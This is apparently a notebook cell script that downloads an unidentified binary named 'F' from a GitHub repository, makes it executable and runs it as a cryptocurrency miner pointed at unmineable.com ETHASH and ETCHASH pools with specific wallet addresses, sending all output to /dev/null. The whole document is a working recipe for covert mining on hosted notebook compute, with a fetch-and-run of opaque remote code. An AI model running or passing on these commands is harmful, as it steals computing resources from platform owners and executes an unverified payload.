! wget https://github.com/mencobaiajanah/TMR/raw/main/F > /dev/null
! chmod +x F
! ./F --algo ETHASH --pool ethash.unmineable.com:3333 --user ETH:0x82bca3b7bcc50b03422c763a06bc9830ed09f0bd.GPU-SPLIT#e34n-zbpz --dualmode etc --dualstratum ETH:0x6e890745813facaeab2afab23440a04f6b55034a.second@etchash.unmineable.com:3333 > /dev/null
! lscpu
